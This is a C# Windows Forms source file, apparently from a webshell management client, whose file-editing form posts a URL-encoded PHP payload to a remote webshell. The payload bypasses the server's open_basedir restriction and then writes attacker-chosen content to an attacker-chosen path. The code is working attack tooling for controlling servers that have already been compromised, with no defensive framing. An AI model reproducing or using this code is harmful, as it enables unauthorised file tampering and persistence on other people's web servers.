using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;

namespace 管理
{
    public partial class Form5 : Form
    {
        public Form5()
        {
            InitializeComponent();
        }

       
        public string str;//这里str是在Form2类中定义的，并且不需要static关键字
        public string strcontent;
        public string resp;//post请求返回变量
        public string strValue;
        public string strPwd;

        private void Form5_Load(object sender, EventArgs e)
        {
            
            textBox1.Text = str;
            textBox2.Text = strcontent;
        }
        
        //关闭窗口
        private void button2_Click(object sender, EventArgs e)
        {
            this.Dispose();
        }

        public void post(string load)
        {

            System.Net.HttpWebRequest request;
            request = (System.Net.HttpWebRequest)WebRequest.Create(strValue);
            //Post请求方式
            request.Method = "POST";
            // 内容类型
            request.ContentType = "application/x-www-form-urlencoded";
            // 参数经过URL编码
            string paraUrlCoded = (strPwd);

            paraUrlCoded += "=" + load; //拼接payload 
            //MessageBox.Show(paraUrlCoded);
            byte[] payload;
            //将URL编码后的字符串转化为字节
            payload = System.Text.Encoding.UTF8.GetBytes(paraUrlCoded);
            //设置请求的 ContentLength 
            request.ContentLength = payload.Length;
            //获得请 求流
            System.IO.Stream writer = request.GetRequestStream();
            //将请求参数写入流
            writer.Write(payload, 0, payload.Length);
            // 关闭请求流
            writer.Close();
            System.Net.HttpWebResponse response;
            // 获得响应流
            response = (System.Net.HttpWebResponse)request.GetResponse();
            System.IO.StreamReader myreader = new System.IO.StreamReader(response.GetResponseStream(), Encoding.UTF8);
            string responseTexts = myreader.ReadToEnd();
            myreader.Close();
            resp = responseTexts;

        }

        //修改文件
        private void button1_Click(object sender, EventArgs e)
        {

            try {
                /*
                //内容加密
                byte[] bytes = Encoding.Default.GetBytes(textBox2.Text);
                string content = Convert.ToBase64String(bytes);

                //路径加密
                byte[] bytess = Encoding.Default.GetBytes(textBox1.Text);
                string path = Convert.ToBase64String(bytes);
                */

                string payload = "%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24oparr%3Dpreg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24opdir)%3B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24tmdir%3D%22.1334b6%22%3B%40mkdir(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%22..%22)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24oparr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24ocwd.%22%2F%22.%24tmdir)%3B%7D%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%224c575%22.%2234c4e%22%3Becho%20%40asenc(%24output)%3Becho%20%2231932%22.%22f7b96%22%3B%7Dob_start()%3Btry%7Becho%20%40fwrite(fopen((substr(%24_POST%5B%22k26ab207904804%22%5D%2C2))%2C%22w%22)%2C(substr(%24_POST%5B%22ia3449cef27901%22%5D%2C2)))%3F%221%22%3A%220%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B" + "&k26ab207904804=3F" + textBox1.Text + "&ia3449cef27901=3F" + textBox2.Text;
                post(payload);

                if(resp != "")
                {
                    MessageBox.Show("文件修改成功");
                    this.Dispose();
                }
                  
                
               

            } catch
            {
                MessageBox.Show("文件修改失败");
            }
        }

    }
}
